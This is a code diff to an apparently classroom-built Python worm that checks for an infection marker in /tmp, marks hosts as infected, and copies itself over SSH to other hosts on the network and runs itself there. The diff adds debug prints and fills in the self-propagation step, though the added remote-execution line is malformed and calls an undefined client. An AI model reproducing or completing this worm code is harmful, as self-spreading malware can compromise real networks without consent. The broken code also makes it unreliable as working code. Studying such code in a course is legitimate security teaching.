@@ -30,13 +30,14 @@ def isInfectedSystem():
 	# you created when you marked the system
 	# as infected). 
 	try:
-		f=open(INFECTED_MARKER_FILE, "r")
-		f.close
+		print("checking for infected.txt")
+		f=open("/tmp/infected.txt", "r")
+		f.close()
+		return True
 	except IOError:
 		print ("system not yet infected")
 		return False
-
-	return True
+	
 
 #################################################################
 # Marks the system as infected
@@ -46,6 +47,7 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
+	print("inside markInfected")
 	infect = open("/tmp/infected.txt","w")
 	infect.write("system has been infect")
 	infect.close()
@@ -67,9 +69,9 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
+	print("inside the spreadAndExecut")
 	sshClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
-	ssh.exec_command("chmod a+x", "python /tmp/replicator_worm.py")
-	pass
+	ssh.exec_command("chmod a+x python /tmp/replicator_worm.py")
 
 
 ############################################################
@@ -230,6 +232,7 @@ if len(sys.argv) < 2:
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
 	if isInfectedSystem() == True:
+		print("system infected already")
 		exit()
 	else:
 		pass
@@ -292,7 +295,9 @@ for host in networkHosts:
 		# If the system was already infected proceed.
 		# Otherwise, infect the system and terminate.
 		# Infect that system
+		print("before if statement")
 		if isInfectedSystem() == False:
+			print("inside if isInfectedSytem() statement ")
 			markInfected()
 			spreadAndExecute(sshInfo[0])
 		else:
